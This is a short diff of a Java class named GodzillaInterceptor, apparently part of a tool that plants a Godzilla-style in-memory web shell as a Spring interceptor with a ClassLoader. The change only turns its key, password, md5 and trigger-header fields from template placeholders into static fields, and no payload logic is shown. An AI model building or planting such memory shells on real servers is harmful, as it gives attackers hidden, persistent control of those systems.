@@ -15,11 +15,11 @@ import java.io.ByteArrayOutputStream;
  * @since 2024/12/22
  */
 public class GodzillaInterceptor extends ClassLoader implements AsyncHandlerInterceptor {
-    public String key = "{{key}}";
-    public String pass = "{{pass}}";
-    public String md5 = "{{md5}}";
-    public String headerName = "{{headerName}}";
-    public String headerValue = "{{headerValue}}";
+    public static String key;
+    public static String pass;
+    public static String md5;
+    public static String headerName;
+    public static String headerValue;
 
     public GodzillaInterceptor(ClassLoader c) {
         super(c);
